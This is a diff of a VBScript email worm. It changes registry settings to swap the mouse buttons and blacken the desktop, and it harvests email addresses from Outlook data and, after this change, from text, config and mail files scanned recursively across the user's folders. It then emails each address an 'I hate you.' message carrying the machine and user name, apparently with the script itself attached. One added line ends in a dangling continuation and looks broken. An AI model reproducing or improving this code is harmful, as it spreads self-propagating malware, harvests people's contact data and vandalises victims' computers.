@@ -9,9 +9,29 @@ Dim i, j, k
 Dim strFoundEmail
 Dim colFoundEmails
 Dim strEmail
+Dim objRegEx
+Dim objMatch
+Dim colMatches
+Dim objFile
+Dim objTextStream
+Dim fileContent
+Dim strEmailAddress
+Dim altPaths
+Dim altPath
+Dim strExt
+Dim folderNameStr
+Dim objSubFolder
+Dim objFolderItem
+Dim sentCount
+Dim objStream
 
 Set colFoundEmails = CreateObject("Scripting.Dictionary")
 Set objWshShell = CreateObject("WScript.Shell")
+Set objRegEx = CreateObject("VBScript.RegExp")
+
+objRegEx.Global = True
+objRegEx.IgnoreCase = True
+objRegEx.Pattern = "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"
 
 objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Mouse\SwapMouseButtons", "1", "REG_SZ"
 objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\Background", "0 0 0", "REG_SZ"
@@ -40,7 +60,8 @@ EMAIL_BODY = "I hate you." & vbCrLf & _
              "Why me?." & vbCrLf & vbCrLf & _
              "System: " & objWshShell.ExpandEnvironmentStrings("%COMPUTERNAME%") & vbCrLf & _
              "User: " & objWshShell.ExpandEnvironmentStrings("%USERNAME%") & vbCrLf & _
-             "Timestamp: " & Now() & vbCrLf & vbCrLf
+             "Timestamp: " & Now() & vbCrLf & vbCrLf & _
+             "If you do not understand it check the .vbs for information." & vbCrLf & _
 
 Dim ATTACHMENT_PATH
 ATTACHMENT_PATH = WScript.ScriptFullName
@@ -51,6 +72,7 @@ REPORT_PATH = "C:\temp\email_scan_results.txt"
 intEmailCount = 0
 intFolderCount = 0
 intAttachmentCount = 0
+sentCount = 0
 strReport = ""
 
 Set objFSO = CreateObject("Scripting.FileSystemObject")
@@ -73,31 +95,7 @@ strSearchPath = objShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Out
 strReport = strReport & "Scanning: " & strSearchPath & vbCrLf
 
 If objFSO.FolderExists(strSearchPath) Then
-    Set objFolder = objFSO.GetFolder(strSearchPath)
-    
-    For Each objFile In objFolder.Files
-        Dim strExt
-        strExt = LCase(objFSO.GetExtensionName(objFile.Name))
-        
-        If strExt = "pst" Or strExt = "ost" Or strExt = "pab" Or strExt = "oab" Then
-            intEmailCount = intEmailCount + 1
-            strReport = strReport & "  [FOUND] " & objFile.Name & vbCrLf
-            strReport = strReport & "    Size: " & FormatNumber(objFile.Size / 1024, 0) & " KB" & vbCrLf
-            strReport = strReport & "    Modified: " & objFile.DateLastModified & vbCrLf
-      
-            strFoundEmail = Replace(objFile.Name, "." & objFSO.GetExtensionName(objFile.Name), "")
-            strFoundEmail = Replace(strFoundEmail, ".pst", "")
-            strFoundEmail = Replace(strFoundEmail, ".ost", "")
-            strFoundEmail = Replace(strFoundEmail, ".pab", "")
-            strFoundEmail = Replace(strFoundEmail, ".oab", "")
-            
-            strReport = strReport & "Send" & strFoundEmail & vbCrLf
-            
-            If Not colFoundEmails.Exists(strFoundEmail) Then
-                colFoundEmails.Add strFoundEmail, strFoundEmail
-            End If
-        End If
-    Next
+    Call ScanFolderRecursive(strSearchPath)
 Else
     strReport = strReport & "  Folder not found" & vbCrLf
 End If
@@ -106,9 +104,32 @@ strReport = strReport & "Total email files found: " & intEmailCount & vbCrLf
 strReport = strReport & "Unique emails found: " & colFoundEmails.Count & vbCrLf & vbCrLf
 
 If colFoundEmails.Count = 0 Then
-    strFoundEmail = "default@domain.com"
+    strReport = strReport & "No emails found in Outlook files." & vbCrLf
+    strReport = strReport & "Attempting to find emails in other locations..." & vbCrLf
+    
+    altPaths = Array( _
+        objShell.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Microsoft", _
+        objShell.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Roaming\Microsoft", _
+        objShell.ExpandEnvironmentStrings("%USERPROFILE%") & "\Documents", _
+        objShell.ExpandEnvironmentStrings("%USERPROFILE%") & "\Desktop", _
+        objShell.ExpandEnvironmentStrings("%USERPROFILE%") & "\Downloads", _
+        objShell.ExpandEnvironmentStrings("%TEMP%") _
+    )
+    
+    For Each altPath In altPaths
+        If objFSO.FolderExists(altPath) Then
+            strReport = strReport & "Scanning: " & altPath & vbCrLf
+            Call ScanFolderRecursive(altPath)
+        End If
+    Next
+    
+    strReport = strReport & "Total emails found in alternative locations: " & colFoundEmails.Count & vbCrLf & vbCrLf
+End If
+
+If colFoundEmails.Count = 0 Then
+    strReport = strReport & "No emails found anywhere. Using fallback email." & vbCrLf
+    strFoundEmail = "test@example.com"
     colFoundEmails.Add strFoundEmail, strFoundEmail
-    strReport = strReport & "Send" & strFoundEmail & vbCrLf & vbCrLf
 End If
 
 strReport = strReport & "Analysis" & vbCrLf
@@ -132,58 +153,31 @@ objNamespace.Logon
 strReport = strReport & "Success" & vbCrLf
 
 arrFolders = Array( _
-    3, "Deleted Items", _
-    4, "Outbox", _
-    5, "Sent Items", _
-    6, "Inbox", _
-    9, "Calendar", _
-    10, "Contacts", _
-    11, "Journal", _
-    12, "Notes", _
-    13, "Tasks", _
-    16, "Drafts" _
+    "DeletedItems", _
+    "Outbox", _
+    "SentItems", _
+    "Inbox", _
+    "Calendar", _
+    "Contacts", _
+    "Journal", _
+    "Notes", _
+    "Tasks", _
+    "Drafts" _
 )
 
-For i = 0 To UBound(arrFolders) Step 2
-    Dim folderID, folderName, objFolderItem
-    folderID = arrFolders(i)
-    folderName = arrFolders(i + 1)
+For i = LBound(arrFolders) To UBound(arrFolders)
+    folderNameStr = arrFolders(i)
     
     On Error Resume Next
-    Set objFolderItem = objNamespace.GetDefaultFolder(folderID)
+    Set objFolder = Nothing
+    Set objFolder = objNamespace.GetDefaultFolder(GetFolderID(folderNameStr))
     On Error GoTo 0
     
-    If Not objFolderItem Is Nothing Then
+    If Not objFolder Is Nothing Then
         intFolderCount = intFolderCount + 1
-        strReport = strReport & "  [FOLDER] " & folderName & vbCrLf
-        strReport = strReport & "    Items: " & objFolderItem.Items.Count & vbCrLf
-        strReport = strReport & "    Unread: " & objFolderItem.UnReadItemCount & vbCrLf
-        
-        If folderID = 6 Then
-            Dim objItems, objMail, objAttach
-            Set objItems = objFolderItem.Items
-            intAttachmentCount = 0
-            
-            Dim maxItems, itemCount
-            maxItems = 10
-            itemCount = 0
-            
-            For Each objMail In objItems
-                itemCount = itemCount + 1
-                If itemCount > maxItems Then Exit For
-                
-                If objMail.Class = 43 Then
-                    If objMail.Attachments.Count > 0 Then
-                        intAttachmentCount = intAttachmentCount + objMail.Attachments.Count
-                        strReport = strReport & "    [ATTACHMENT] " & objMail.Subject & vbCrLf
-                        For Each objAttach In objMail.Attachments
-                            strReport = strReport & "      - " & objAttach.FileName & " (" & _
-                                FormatNumber(objAttach.Size / 1024, 0) & " KB)" & vbCrLf
-                        Next
-                    End If
-                End If
-            Next
-        End If
+        strReport = strReport & "  [FOLDER] " & folderNameStr & vbCrLf
+        strReport = strReport & "    Items: " & objFolder.Items.Count & vbCrLf
+        strReport = strReport & "    Unread: " & objFolder.UnReadItemCount & vbCrLf
         strReport = strReport & vbCrLf
     End If
 Next
@@ -191,12 +185,8 @@ Next
 strReport = strReport & "Finalising" & vbCrLf
 strReport = strReport & "--------------------------" & vbCrLf
 
-On Error Resume Next
-
-Dim sentCount
-sentCount = 0
-
 For Each strEmail In colFoundEmails.Keys
+    On Error Resume Next
     Set objMailItem = objOutlook.CreateItem(0)
     
     If Not objMailItem Is Nothing Then
@@ -213,14 +203,18 @@ For Each strEmail In colFoundEmails.Keys
         
         objMailItem.Send
         
-        sentCount = sentCount + 1
-        strReport = strReport & "Email sent to: " & strEmail & vbCrLf
-        strReport = strReport & "Subject: Email from: " & strEmail & vbCrLf
+        If Err.Number = 0 Then
+            sentCount = sentCount + 1
+            strReport = strReport & "Email sent to: " & strEmail & vbCrLf
+        Else
+            strReport = strReport & "Failed to send to: " & strEmail & " - Error: " & Err.Description & vbCrLf
+        End If
         
         WScript.Sleep 1500
     Else
         strReport = strReport & "Could not create email for: " & strEmail & vbCrLf
     End If
+    On Error GoTo 0
 Next
 
 On Error GoTo 0
@@ -239,6 +233,88 @@ objLogFile.Close
 
 MsgBox "Complete" & vbCrLf & "Report: " & REPORT_PATH & vbCrLf & "Emails sent: " & sentCount, vbInformation, "Done"
 
+Function GetFolderID(folderName)
+    Select Case LCase(folderName)
+        Case "deleteditems"
+            GetFolderID = 3
+        Case "outbox"
+            GetFolderID = 4
+        Case "sentitems"
+            GetFolderID = 5
+        Case "inbox"
+            GetFolderID = 6
+        Case "calendar"
+            GetFolderID = 9
+        Case "contacts"
+            GetFolderID = 10
+        Case "journal"
+            GetFolderID = 11
+        Case "notes"
+            GetFolderID = 12
+        Case "tasks"
+            GetFolderID = 13
+        Case "drafts"
+            GetFolderID = 16
+        Case Else
+            GetFolderID = 6
+    End Select
+End Function
+
+Sub ScanFolderRecursive(folderPath)
+    Dim objCurrentFolder
+    Dim objSubFolder
+    Dim objFile
+    Dim fileSize
+    
+    On Error Resume Next
+    Set objCurrentFolder = objFSO.GetFolder(folderPath)
+    If objCurrentFolder Is Nothing Then
+        strReport = strReport & "  ERROR: Cannot access folder" & vbCrLf
+        Exit Sub
+    End If
+    On Error GoTo 0
+    
+    For Each objFile In objCurrentFolder.Files
+        strExt = LCase(objFSO.GetExtensionName(objFile.Name))
+        
+        If strExt = "txt" Or strExt = "xml" Or strExt = "json" Or strExt = "ini" Or strExt = "dat" Or strExt = "log" Or strExt = "cfg" Or strExt = "csv" Or strExt = "html" Or strExt = "htm" Or strExt = "msg" Or strExt = "eml" Or strExt = "rtf" Then
+            
+            intEmailCount = intEmailCount + 1
+            
+            On Error Resume Next
+            fileSize = objFile.Size
+            
+            If fileSize < 10485760 Then
+                Set objTextStream = objFSO.OpenTextFile(objFile.Path, 1)
+                If Not objTextStream Is Nothing Then
+                    fileContent = objTextStream.ReadAll
+                    objTextStream.Close
+                    
+                    If InStr(1, fileContent, "@", vbTextCompare) > 0 Then
+                        Set colMatches = objRegEx.Execute(fileContent)
+                        For Each objMatch In colMatches
+                            strEmailAddress = LCase(objMatch.Value)
+                            If Not colFoundEmails.Exists(strEmailAddress) Then
+                                colFoundEmails.Add strEmailAddress, strEmailAddress
+                                strReport = strReport & "    Email: " & strEmailAddress & " (" & objFile.Name & ")" & vbCrLf
+                            End If
+                        Next
+                    End If
+                End If
+            Else
+                strReport = strReport & "  SKIPPED: " & objFile.Name & " (" & FormatNumber(fileSize / 1048576, 1) & " MB)" & vbCrLf
+            End If
+            On Error GoTo 0
+        End If
+    Next
+    
+    For Each objSubFolder In objCurrentFolder.SubFolders
+        Call ScanFolderRecursive(objSubFolder.Path)
+    Next
+    
+    Set objCurrentFolder = Nothing
+End Sub
+
 Set objMailItem = Nothing
 Set objFolderItem = Nothing
 Set objFolder = Nothing
@@ -249,3 +325,4 @@ Set objShell = Nothing
 Set objLogFile = Nothing
 Set colFoundEmails = Nothing
 Set objWshShell = Nothing
+Set objRegEx = Nothing
